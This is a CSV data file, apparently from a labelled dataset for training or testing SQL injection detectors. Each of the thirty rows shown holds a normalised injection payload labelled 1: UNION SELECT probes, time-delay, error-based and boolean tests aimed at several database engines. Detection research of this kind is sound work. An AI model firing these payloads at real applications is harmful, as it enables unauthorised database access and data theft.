row_index,payload_norm,label,sqli_type_hint
8220,"-7422"" union all select 9127,9127,9127,9127,9127,9127,9127,9127,9127,9127#",1,
8221,"-4121%"" ) union all select 2659,2659,2659,2659,2659,2659,2659,2659--",1,
8222,end and '%' = ',1,
8223,"1 ) union all select null,null#",1,
8224,"-5957 ) ) ) union all select 8485,8485,8485,8485,8485,8485,8485,8485,8485--",1,
8225,1' waitfor delay '0:0:5',1,
8226,select ( case when ( 9030 = 6952 ) then 1 else 9030* ( select 9030 from master..sysdatabases ) end ) --,1,
8227,"1' ) as vmmk where 5757 = 5757 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
8228,"1'+ ( select 'ngdk' where 7264 = 7264 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) ) +'",1,
8229,"1'|| ( select 'mgel' where 3591 = 3591 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) ||'",1,
8230,"1 ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( 5507 = 5507",1,
8231,"1' ) as jiic where 6158 = 6158 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",1,
8232,1' waitfor delay '0:0:5' and 'vwuz' = 'vwuz,1,
8233,"1' and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and 'gzlz' like 'gzlz",1,
8234,"-1434' ) ) union all select 4734,4734,4734,4734,4734,4734,4734,4734,4734,4734#",1,
8235,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""fkdx"" like ""fkdx",1,
8236,"1"" ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ""eeye"" = ""eeye",1,
8237,"1"" ) as rgbz where 6687 = 6687 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
8238,"-1197"" ) ) as dfsy where 8857 = 8857 or 3038 = 3038",1,
8239,"1' in boolean mode ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) #",1,
8240,"1"" ) ) ) union all select null#",1,
8241,"1'|| ( select 'hwyv' from dual where 1155 = 1155 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) ) ||'",1,
8242,"1' or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and 'zpyx' = 'zpyx",1,
8243,"1'|| ( select 'fmss' from dual where 7025 = 7025 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) ) ||'",1,
8244,"1"" ) as ltoa where 9159 = 9159 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",1,
8245,"-7887' ) union all select 9049,9049,9049,9049,9049,9049,9049,9049,9049,9049#",1,
8246,"-8309'|| ( select 'qecl' where 8449 = 8449 union all select 8449,8449,8449,8449,8449,8449,8449--",1,
8247,"-7111 union all select 2409,2409,2409,2409,2409,2409#",1,
8248,1' ) where 6092 = 6092,1,
8249,"1' ) ) as lxjs where 6503 = 6503 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) --",1,
